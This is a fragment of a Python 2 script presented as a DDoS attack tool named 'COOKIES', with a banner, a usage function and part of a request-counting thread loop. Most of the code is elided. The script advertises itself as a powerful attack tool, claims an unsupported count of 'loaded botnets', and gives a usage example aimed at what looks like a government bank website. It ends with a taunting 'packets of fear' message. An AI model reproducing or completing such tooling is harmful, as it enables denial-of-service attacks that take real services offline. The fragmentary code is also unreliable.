# ----------------------------------------------------------------------------------------------
# COOKIES The Deadlist iDDOS Tool
#
# COOKIES it's one of the Most Powerful iDDOS Tool
...
def usage():
	print 'COOKIES iDDoS Tool'
	print 'https://www.facebook.com/azka.callister'
	print 'Loaded Botnets: 1,798,498'
	print 'Usage: cookies (url)'
	print 'Example: Cookies.py http://israbank.gov.il/'
	print "\a"
print \
"""
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending massive packets of fear by Axillerz --"
